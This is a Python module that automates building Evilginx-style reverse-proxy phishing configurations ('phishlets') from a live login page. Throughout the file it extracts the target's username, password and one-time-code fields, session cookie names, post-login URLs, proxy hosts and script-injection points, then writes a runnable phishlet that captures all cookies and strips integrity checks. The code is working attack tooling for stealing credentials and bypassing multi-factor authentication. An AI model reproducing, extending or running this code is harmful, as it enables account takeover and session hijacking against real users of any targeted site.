"""Phishlet forge - build a working phishlet from a live login page.

Writing a phishlet by hand (Evilginx style) means reading the target's HTML,
its JS bundles, its redirect chain and its cookie names, then transcribing all
of it into YAML. That is hours of work per target and the usual place an
engagement goes wrong. This module does the reconnaissance part mechanically and
emits a phishlet you can run, then tells you exactly what it could verify and
what it is guessing at.

What it extracts:
  * proxy_hosts   - every host the page talks to (forms, scripts, links, inline
                    fetch/XHR URLs), split into domain + subdomain, landing host
                    marked, static/CDN hosts marked session=False
  * credentials   - the login form's own field names, method and content type
  * auth_tokens   - cookie names set by the response and named in JS
  * auth_urls     - post-login URLs the page reveals (redirect targets, success
                    paths), used to detect a completed session
  * sub_filters   - the origin/domain strings that must be rewritten so the page
                    does not call the real site behind our back
  * js_inject     - the points where our capture hook is safe to inject

Nothing here is guessed silently: every item carries a confidence and the report
says which ones need a human look before the phishlet goes live.
"""
import json
import os
import re
import urllib.parse
from html.parser import HTMLParser

DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

STATIC_HINTS = ("cdn", "static", "assets", "img", "images", "fonts", "jsdelivr",
                "cloudflare", "gstatic", "googleapis", "akamai", "fastly",
                "bootstrapcdn", "unpkg", "cdnjs")
LOGIN_HINTS = ("login", "signin", "sign-in", "auth", "session", "account",
               "oauth", "sso", "id", "identity", "saml", "adfs")
USER_FIELDS = ("user", "email", "login", "username", "identifier", "account",
               "userid", "user_name", "emailaddress", "loginid", "phone",
               "mobile", "msisdn", "uname")
PASS_FIELDS = ("pass", "password", "passwd", "pwd", "secret", "pin")
OTP_FIELDS = ("otp", "code", "token", "mfa", "2fa", "verification", "otpcode",
              "authcode", "onetimepasscode", "securitycode", "smscode")
SUBMIT_NAMES = ("login", "signin", "sign_in", "submit", "next", "continue",
                "log_in", "loginbutton")


class _FormParser(HTMLParser):
    """Collect forms, their inputs and the script/link/fetch URLs on a page."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.forms = []
        self.scripts = []
        self.links = []
        self.metas = []
        self._form = None
        self._in_script = False
        self._script_buf = []
        self.inline_js = []

    def handle_starttag(self, tag, attrs):
        a = {k.lower(): (v or "") for k, v in attrs}
        if tag == "form":
            self._form = {"action": a.get("action", ""), "method": (a.get("method") or "get").lower(),
                          "id": a.get("id", ""), "name": a.get("name", ""),
                          "inputs": [], "autocomplete": a.get("autocomplete", "")}
        elif tag in ("input", "select", "textarea") and self._form is not None:
            self._form["inputs"].append({
                "name": a.get("name", ""), "type": (a.get("type") or tag).lower(),
                "id": a.get("id", ""), "placeholder": a.get("placeholder", ""),
                "autocomplete": a.get("autocomplete", ""), "value": a.get("value", "")})
        elif tag == "button" and self._form is not None:
            self._form["inputs"].append({"name": a.get("name", ""), "type": "submit",
                                         "id": a.get("id", ""),
                                         "placeholder": "", "autocomplete": "",
                                         "value": a.get("value", "")})
        elif tag == "script":
            src = a.get("src", "")
            if src:
                self.scripts.append(src)
            self._in_script = not src
            self._script_buf = []
        elif tag == "link" and a.get("href"):
            self.links.append(a["href"])
        elif tag == "meta" and a.get("content"):
            self.metas.append({"name": (a.get("name") or a.get("property") or "").lower(),
                               "content": a["content"]})

    def handle_endtag(self, tag):
        if tag == "form" and self._form is not None:
            self.forms.append(self._form)
            self._form = None
        elif tag == "script" and self._in_script:
            self.inline_js.append("".join(self._script_buf))
            self._in_script = False

    def handle_data(self, data):
        if self._in_script:
            self._script_buf.append(data)


def _host_of(url, base):
    """Absolute host for a possibly-relative URL."""
    if not url:
        return ""
    if url.startswith(("data:", "javascript:", "mailto:", "tel:", "#")):
        return ""
    try:
        absu = urllib.parse.urljoin(base, url)
        return (urllib.parse.urlparse(absu).hostname or "").lower()
    except Exception:
        return ""


# Multi-part public suffixes we are likely to meet. A last-two-labels split
# turned login.example.co.uk into ("co.uk", "login.example"), which then became
# the phishlet's domain and a rewrite filter for a bare public suffix.
MULTI_PART_SUFFIXES = (
    "co.uk", "org.uk", "ac.uk", "gov.uk", "me.uk", "net.uk", "sch.uk",
    "com.au", "net.au", "org.au", "edu.au", "gov.au", "id.au",
    "co.in", "net.in", "org.in", "gen.in", "firm.in", "ind.in", "ac.in",
    "edu.in", "gov.in", "res.in", "nic.in",
    "co.jp", "or.jp", "ne.jp", "ac.jp", "go.jp",
    "com.br", "net.br", "org.br", "gov.br", "com.mx", "com.ar", "com.co",
    "co.za", "org.za", "co.nz", "net.nz", "org.nz", "govt.nz",
    "com.sg", "com.my", "com.hk", "com.tw", "com.cn", "com.tr",
    "co.kr", "or.kr", "com.sa", "com.ae", "co.il", "com.pk", "com.bd",
    "com.ng", "com.eg", "com.ph", "com.vn", "co.th", "com.pe", "com.ec",
)


def _is_ip_literal(host):
    return bool(re.fullmatch(r"[0-9]{1,3}(\.[0-9]{1,3}){3}", str(host or "")))


def _split_host(host):
    """(domain, sub) for a hostname: login.okta.com -> (okta.com, login).

    Handles multi-part public suffixes and IP literals, which a naive
    last-two-labels split gets wrong (and a wrong domain propagates into
    proxy_hosts and every rewrite filter).
    """
    h = str(host or "").lower().strip(".")
    if not h or _is_ip_literal(h):
        return (h, "")
    parts = [p for p in h.split(".") if p]
    if len(parts) <= 2:
        return (h, "")
    last2 = ".".join(parts[-2:])
    if last2 in MULTI_PART_SUFFIXES and len(parts) >= 3:
        return (".".join(parts[-3:]), ".".join(parts[:-3]))
    return (last2, ".".join(parts[:-2]))


def _urls_in_js(js, base):
    """Absolute URLs and host-looking strings referenced from inline JS."""
    out = set()
    for m in re.finditer(r"""["'`](https?://[^"'`\s<>]{4,200})["'`]""", js or ""):
        out.add(m.group(1))
    for m in re.finditer(r"""["'`](//[a-z0-9.\-]+\.[a-z]{2,}[^"'`\s<>]{0,120})["'`]""",
                         js or "", re.I):
        out.add("https:" + m.group(1))
    for m in re.finditer(r"""["'`](/[a-z0-9_\-/]{2,60})["'`]""", js or "", re.I):
        out.add(urllib.parse.urljoin(base, m.group(1)))
    return out


def _cookies_in_js(js):
    """Cookie names the page itself names (document.cookie, js-cookie, etc.)."""
    names = set()
    for m in re.finditer(r"""document\.cookie\s*=\s*["'`]([^=;"'`]+)=""", js or ""):
        names.add(m.group(1).strip())
    for m in re.finditer(r"""Cookies?\.(?:set|get|remove)\(\s*["'`]([^"'`]{1,40})["'`]""",
                         js or ""):
        names.add(m.group(1).strip())
    for m in re.finditer(r"""["'`]([a-z0-9_\-]{2,40})["'`]\s*\]\s*=\s*.*?document\.cookie""",
                         js or "", re.I):
        names.add(m.group(1))
    return {n for n in names if n and not n.startswith("_")}


# names that look credential-ish but never are: CSRF, anti-automation, analytics
NEVER_CRED = ("csrf", "xsrf", "authenticity", "token", "timestamp", "nonce",
              "captcha", "recaptcha", "hcaptcha", "hp_", "honeypot", "secret",
              "signature", "state", "redirect", "return", "next", "remember",
              "add_account", "webauthn", "device", "fingerprint", "utm", "ref",
              "g-recaptcha", "challenge", "assertion", "saml", "relay")

VISIBLE_TYPES = ("text", "email", "tel", "search", "url", "number")


def _is_hidden(inp):
    return (inp.get("type") or "").lower() in ("hidden", "submit", "button",
                                               "image", "reset", "file", "checkbox",
                                               "radio")


def _word_hit(text, tokens):
    """Token match on word boundaries (and camelCase/concatenated forms)."""
    from .classify import _has_token
    return _has_token([str(text).lower()], tokens)


def _score_user_field(inp):
    """Higher is more likely to be the account field a human types."""
    if _is_hidden(inp):
        return -1
    blob = " ".join([inp.get("name", ""), inp.get("id", ""),
                     inp.get("placeholder", ""), inp.get("autocomplete", "")]).lower()
    # boundary match: "ref" inside "preferred_username" is not a redirect field
    if any(_word_hit(blob, (t,)) for t in NEVER_CRED):
        return -1
    score = 0
    if inp.get("type") in ("email", "tel"):
        score += 40
    if inp.get("type") in VISIBLE_TYPES:
        score += 10
    for t in ("username", "user_name", "userid", "user_id", "login", "loginid",
              "email", "emailaddress", "account", "identifier", "user"):
        if _word_hit(blob, (t,)):
            score += 30
            break
    if "autocomplete" in inp and inp.get("autocomplete") in ("username", "email"):
        score += 25
    if inp.get("type") == "password":
        score -= 100
    return score


def _score_pass_field(inp):
    """An explicit type=password wins outright; nothing else comes close."""
    if _is_hidden(inp):
        return -1
    blob = " ".join([inp.get("name", ""), inp.get("id", ""),
                     inp.get("placeholder", "")]).lower()
    if any(_word_hit(blob, (t,)) for t in NEVER_CRED):
        return -1
    if inp.get("type") == "password":
        return 100
    score = 0
    # boundary match: "pass" inside "passenger_name"/"compass" is not a password
    if _word_hit(blob, ("password", "passwd", "pwd", "pass")):
        score += 40
    return score


def _pick_credentials(form, otp_names=()):
    """(user_input, pass_input) for a form, or (None, None)."""
    best_u, best_p, su, sp = None, None, 0, 0
    for inp in form.get("inputs", []):
        # boundary match: skipping on "code"/"token" substrings also skipped
        # real account fields such as user_code or login_token
        if otp_names and _word_hit(inp.get("name") or "", otp_names):
            continue
        u = _score_user_field(inp)
        if u > su:
            best_u, su = inp, u
        p = _score_pass_field(inp)
        if p > sp:
            best_p, sp = inp, p
    return (best_u if su > 0 else None), (best_p if sp > 0 else None)


def _form_kind(form):
    """Classify a form: credentials, otp, or unrelated."""
    inputs = form.get("inputs", [])
    has_user = any(_word_hit(i.get("name") or i.get("id") or "", USER_FIELDS)
                   for i in inputs
                   if i.get("type") in ("text", "email", "tel", "search")
                   and not _is_hidden(i))
    has_pass = any(not _is_hidden(i) and
                   (i.get("type") == "password" or
                    _word_hit(i.get("name") or i.get("id") or "", PASS_FIELDS))
                   for i in inputs)
    # an OTP form needs a visible, non-CSRF code field
    has_otp = any(not _is_hidden(i)
                  and _word_hit(i.get("name") or i.get("id") or "", OTP_FIELDS)
                  and not any(_word_hit(i.get("name") or "", (t,)) for t in NEVER_CRED)
                  for i in inputs)
    if has_pass:
        return "credentials"
    if has_otp and not has_user:
        return "otp"
    if has_user:
        return "identity"
    return "other"


def forge(url, ua=None, verify=True, timeout=25, snapshot=None, headers=None):
    """Analyse a login page and return a phishlet blueprint.

    `snapshot` is a saved {path: {status, body, headers}} map (see
    core.session.load_replay): with it, forging works with no live traffic.
    """
    import requests

    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise ValueError(f"not a fetchable URL: {url!r}")
    hdrs = {"User-Agent": ua or DEFAULT_UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9"}
    hdrs.update(headers or {})
    notes = []
    status, final_url, body, set_cookies = 0, url, "", []

    if snapshot:
        key = parsed.path or "/"
        entry = snapshot.get(url) or snapshot.get(key)
        if entry is None:
            notes.append(f"snapshot has no entry for {key!r} - nothing analysed")
            entry = {}
        status = int(entry.get("status", 200))
        body = entry.get("body", "") or ""
        raw_sc = (entry.get("headers") or {}).get("Set-Cookie", [])
        # a hand-written snapshot carries it as one string; iterating a string
        # would yield its characters as cookie names
        if isinstance(raw_sc, str):
            set_cookies = [raw_sc]
        else:
            set_cookies = [str(x) for x in (raw_sc or [])]
        notes.append("analysed from a saved snapshot (no live traffic)")
    else:
        r = requests.get(url, headers=hdrs, timeout=timeout, verify=verify,
                         allow_redirects=True)
        status, final_url, body = r.status_code, str(r.url), r.text
        set_cookies = r.raw.headers.getlist("Set-Cookie") if hasattr(r.raw.headers, "getlist") else []
        if r.history:
            notes.append(f"followed {len(r.history)} redirect(s) -> {final_url}")

    p = _FormParser()
    try:
        p.feed(body)
    except Exception as e:
        notes.append(f"HTML parse issue: {type(e).__name__}")

    base = final_url
    login_host = (urllib.parse.urlparse(final_url).hostname or parsed.hostname or "").lower()

    # ---- hosts ----
    hosts = {}
    def note_host(h, why):
        # localhost/.local are not mirrored hosts; the old guard fell through
        # (pass) so they became proxy hosts and produced rewrite filters that
        # would mangle legitimate page content
        # localhost/.local cannot be mirrored (no public name); an IP literal
        # CAN - lab and internal apps are legitimate forge targets
        if not h or h.endswith(".local") or h == "localhost":
            return
        hosts.setdefault(h, {"reasons": set(), "paths": set()})
        hosts[h]["reasons"].add(why)

    note_host(login_host, "landing")
    for f in p.forms:
        note_host(_host_of(f.get("action", ""), base), "form-action")
    for s in p.scripts:
        note_host(_host_of(s, base), "script")
    for link_href in p.links:
        note_host(_host_of(link_href, base), "asset")
    js_all = "\n".join(p.inline_js)
    for u in _urls_in_js(js_all, base):
        note_host(_host_of(u, base), "js")
    for m in p.metas:
        if m["name"] in ("og:url", "twitter:url", "canonical"):
            note_host(_host_of(m["content"], base), "meta")

    # ---- forms ----
    forms = []
    for f in p.forms:
        kind = _form_kind(f)
        action_host = _host_of(f.get("action", ""), base) or login_host
        forms.append({"kind": kind, "action": f.get("action", ""), "method": f.get("method", "get"),
                      "host": action_host, "inputs": f.get("inputs", [])})
    cred_form = next((f for f in forms if f["kind"] == "credentials"), None)
    otp_form = next((f for f in forms if f["kind"] == "otp"), None)
    id_form = next((f for f in forms if f["kind"] == "identity"), None)

    # ---- credentials ----
    credentials = {}
    if cred_form:
        u_inp, p_inp = _pick_credentials(cred_form, OTP_FIELDS)
        if u_inp and u_inp.get("name"):
            credentials["username"] = {"key": u_inp["name"], "search": "(.*)",
                                       "type": "post"}
        if p_inp and p_inp.get("name"):
            credentials["password"] = {"key": p_inp["name"], "search": "(.*)",
                                       "type": "post"}
    if id_form and "username" not in credentials:
        u_inp, _ = _pick_credentials(id_form, OTP_FIELDS)
        if u_inp and u_inp.get("name"):
            credentials["username"] = {"key": u_inp["name"], "search": "(.*)",
                                       "type": "post"}
    if otp_form:
        for i in otp_form["inputs"]:
            nm = (i.get("name") or "").strip()
            if not nm or _is_hidden(i):
                continue                     # a hidden CSRF token is not the OTP
            if any(_word_hit(nm, (t,)) for t in NEVER_CRED):
                continue
            if _word_hit(nm, OTP_FIELDS):
                credentials["otp"] = {"key": nm, "search": "([0-9]{4,8})", "type": "post"}
                break

    # ---- auth tokens ----
    tokens = set()
    for raw in set_cookies:
        n = str(raw).split("=")[0].strip()
        if n and not n.startswith(("__cf", "cf_", "_ga", "_gid", "AWSALB", "ak_bmsc")):
            tokens.add(n)
    tokens |= _cookies_in_js(js_all)
    for m in re.finditer(r"""(?:localStorage|sessionStorage)\.(?:set|get)Item\(\s*["'`]([^"'`]{1,40})["'`]""",
                         js_all):
        tokens.add(m.group(1))
    tokens = {t for t in tokens if 1 < len(t) <= 40 and not t.startswith("_")}

    # ---- auth urls ----
    auth_urls = set()
    # {2,60} required two characters before the keyword, so the common paths
    # (/app, /home, /account, /dashboard) never matched and URL-based session
    # detection never fired. Anchored, because an unanchored /app also matched
    # /application and /static/app.js.
    for m in re.finditer(r"""["'`](/[a-z0-9_\-/]{0,60}(?:dashboard|home|account|app|portal|profile|welcome|inbox|feed)[a-z0-9_\-/]{0,40})["'`]""",
                         js_all, re.I):
        auth_urls.add("^" + re.escape(m.group(1)) + "$")
    for f in forms:
        if f["kind"] in ("otp", "identity"):
            continue
    if p.metas:
        for m in p.metas:
            if m["name"] in ("og:url", "canonical"):
                path = urllib.parse.urlparse(m["content"]).path or "/"
                # a bare "/" would mark every request as a completed session
                if path not in ("/", ""):
                    auth_urls.add(re.escape(path))

    # ---- sub_filters ----
    filters = []
    seen_pairs = set()
    for h in hosts:
        if h == login_host:
            continue
        dom, sub = _split_host(h)
        for search in ({h, dom} - {""}):
            if search in seen_pairs:
                continue
            seen_pairs.add(search)
            filters.append({"search": re.escape(search), "replace": "{hostname}",
                            "mimes": ["text/html", "application/javascript", "application/json",
                                      "text/css", "text/plain"]})

    # ---- proxy hosts ----
    proxy_hosts = []
    for h in sorted(hosts, key=lambda x: (x != login_host, x)):
        dom, sub = _split_host(h)
        is_static = any(t in h for t in STATIC_HINTS) or \
            ("asset" in hosts[h]["reasons"] and h != login_host
             and "form-action" not in hosts[h]["reasons"])
        proxy_hosts.append({"domain": dom, "phish_sub": sub, "orig_sub": sub,
                            "session": not is_static, "is_landing": h == login_host,
                            "reasons": sorted(hosts[h]["reasons"])})

    # ---- js inject ----
    js_inject = []
    for f in forms:
        if f["kind"] in ("credentials", "identity", "otp"):
            pth = urllib.parse.urlparse(urllib.parse.urljoin(base, f.get("action", ""))).path or "/"
            entry = {"trigger_domains": [login_host],
                     "trigger_paths": ["^" + re.escape(pth) + "$", "^/$"],
                     "mimes": ["text/html"]}
            if entry not in js_inject:
                js_inject.append(entry)

    analysis = {
        "url": url, "final_url": final_url, "status": status, "host": login_host,
        "domain": _split_host(login_host)[0], "sub": _split_host(login_host)[1],
        "title": _title(body), "notes": notes,
        "forms": forms, "credentials": credentials,
        "auth_tokens": sorted(tokens), "auth_urls": sorted(auth_urls),
        "sub_filters": filters, "proxy_hosts": proxy_hosts, "js_inject": js_inject,
        "js_bundles": [s for s in p.scripts if s.startswith(("http", "//"))][:40],
        "confidence": {},
    }
    analysis["confidence"] = _confidence(analysis)
    return analysis


def _title(body):
    m = re.search(r"<title[^>]*>(.*?)</title>", body or "", re.I | re.S)
    return (m.group(1).strip()[:120] if m else "")


SESSION_TOKEN_HINTS = ("session", "sess", "auth", "jwt", "access", "refresh",
                      "bearer", "sid", "token", "remember", "login", "user")
STATIC_TOKEN_HINTS = ("logged_in", "consent", "locale", "lang", "theme", "tz",
                      "timezone", "gdpr", "notice", "banner", "pref", "ab_",
                      "track", "analytics", "utm", "campaign")


def rank_tokens(names):
    """(required, optional) auth-token names for a forged phishlet.

    Exactly one class of token means "the session": anything named like a
    session/auth token. The rest are optional, because requiring every cookie a
    site sets would mean the session never registers as captured.
    """
    required, optional = [], []
    for n in names:
        low = str(n).lower()
        if _word_hit(low, ("csrf", "xsrf")):
            # a CSRF token is never the session: requiring it means a site that
            # keeps it in a header rather than a cookie never completes
            optional.append(n)
            continue
        static = _word_hit(low, STATIC_TOKEN_HINTS)
        session_like = _word_hit(low, SESSION_TOKEN_HINTS)
        if static and not session_like:
            optional.append(n)
        elif session_like:
            required.append(n)
        else:
            optional.append(n)
    if not required and optional:
        # nothing looked like a session token: require the strongest remaining
        # candidate (longest name) rather than an analytics or preference cookie
        pool = [n for n in optional if not _word_hit(str(n).lower(),
                                                     ("ab_", "utm", "theme", "lang",
                                                      "locale", "consent", "gdpr"))]
        pool = pool or optional
        ranked = sorted(pool, key=lambda n: (-len(str(n)), str(n)))
        required = [ranked[0]]
        optional = [n for n in optional if n != ranked[0]]
    return required, optional


def _confidence(a):
    """Per-section confidence, so a guess is never read as a verified fact."""
    out = {}
    out["credentials"] = ("high" if a["credentials"].get("password") and
                          a["credentials"].get("username")
                          else "medium" if a["credentials"] else "low")
    out["auth_tokens"] = ("high" if len(a["auth_tokens"]) >= 2
                          else "medium" if a["auth_tokens"] else "low")
    out["auth_urls"] = "high" if a["auth_urls"] else "low"
    out["proxy_hosts"] = "high" if len(a["proxy_hosts"]) > 1 else "medium"
    out["sub_filters"] = "medium"
    out["js_inject"] = "high" if a["js_inject"] else "low"
    return out


def to_phishlet(analysis, name=None, upstream=None):
    """Turn an analysis into a runnable Phishlet."""
    from .phishlet import AuthToken, CredentialField, JsInject, Phishlet, ProxyHost, SubFilter

    dom = analysis.get("domain") or analysis.get("host") or ""
    phishlet = Phishlet(
        name=name or (dom.replace(".", "-") + "-login" if dom else "forged"),
        upstream=upstream or analysis.get("host") or "",
        proxy_hosts=[ProxyHost(domain=h["domain"], phish_sub=h.get("phish_sub", ""),
                               orig_sub=h.get("orig_sub", ""),
                               session=bool(h.get("session", True)),
                               is_landing=bool(h.get("is_landing")))
                     for h in analysis.get("proxy_hosts", [])],
        sub_filters=[SubFilter(search=f["search"], replace=f["replace"],
                               mimes=f.get("mimes"))
                     for f in analysis.get("sub_filters", [])],
        js_inject=[JsInject(trigger_domains=j.get("trigger_domains"),
                            trigger_paths=j.get("trigger_paths"),
                            mimes=j.get("mimes"))
                   for j in analysis.get("js_inject", [])],
        auth_tokens=[AuthToken(keys=req) for req in _token_specs(analysis)],
        auth_urls=list(analysis.get("auth_urls", [])),
        credentials={k: CredentialField(v["key"], v.get("search", "(.*)"),
                                        v.get("type", "post"))
                     for k, v in (analysis.get("credentials") or {}).items()},
        capture_cookies=["*"], inject_paths=[".*"], strip_integrity=True,
    )
    return phishlet


def _token_specs(analysis):
    """[[required...], [optional with :opt], ...] for a forged phishlet."""
    names = list(analysis.get("auth_tokens") or [])
    required, optional = rank_tokens(names)
    specs = []
    if required:
        specs.append(list(required))
    if optional:
        specs.append([f"{o}:opt" for o in optional])
    return specs


def write(analysis, path, name=None, upstream=None):
    """Write the forged phishlet as YAML (with the analysis next to it)."""
    phishlet = to_phishlet(analysis, name=name, upstream=upstream)
    phishlet.to_yaml(path)
    side = os.path.splitext(path)[0] + ".analysis.json"
    with open(side, "w", encoding="utf-8") as f:
        json.dump(analysis, f, indent=2, default=str)
    return phishlet, side


def report(analysis):
    """Human-readable summary: what was found, and what needs a human look."""
    c = analysis.get("confidence", {})
    lines = []
    lines.append(f"target     : {analysis.get('final_url')}")
    lines.append(f"status     : {analysis.get('status')}   title: {analysis.get('title')!r}")
    lines.append(f"landing    : host={analysis.get('host')} domain={analysis.get('domain')} "
                 f"sub={analysis.get('sub') or '-'}")
    for n in analysis.get("notes", []):
        lines.append(f"note       : {n}")
    lines.append("")
    lines.append(f"proxy_hosts ({len(analysis.get('proxy_hosts', []))}) "
                 f"[{c.get('proxy_hosts')}]")
    for h in analysis.get("proxy_hosts", []):
        lines.append(f"   {h['domain']:<28} sub={h.get('orig_sub') or '-':<12} "
                     f"session={h.get('session')} landing={h.get('is_landing')} "
                     f"({','.join(h.get('reasons', []))})")
    lines.append("")
    lines.append(f"credentials [{c.get('credentials')}]")
    for k, v in (analysis.get("credentials") or {}).items():
        lines.append(f"   {k:<10} field={v['key']!r} type={v['type']} search={v['search']!r}")
    if not analysis.get("credentials"):
        lines.append("   none found - inspect the login form by hand")
    lines.append("")
    req, opt = rank_tokens(analysis.get("auth_tokens") or [])
    lines.append(f"auth_tokens [{c.get('auth_tokens')}]")
    lines.append(f"   required  : {', '.join(req) or 'none'}")
    lines.append(f"   optional  : {', '.join(opt) or 'none'}")
    lines.append(f"auth_urls   [{c.get('auth_urls')}]: "
                 f"{', '.join(analysis.get('auth_urls') or []) or 'none found'}")
    lines.append(f"sub_filters : {len(analysis.get('sub_filters', []))} [{c.get('sub_filters')}]")
    lines.append(f"js_inject   : {len(analysis.get('js_inject', []))} [{c.get('js_inject')}]")
    lines.append("")
    lines.append("review before use: token names and the post-login URL are read from")
    lines.append("the page, so a site that sets its session cookie only on a successful")
    lines.append("POST will need that name added by hand (or probe it live).")
    return "\n".join(lines)
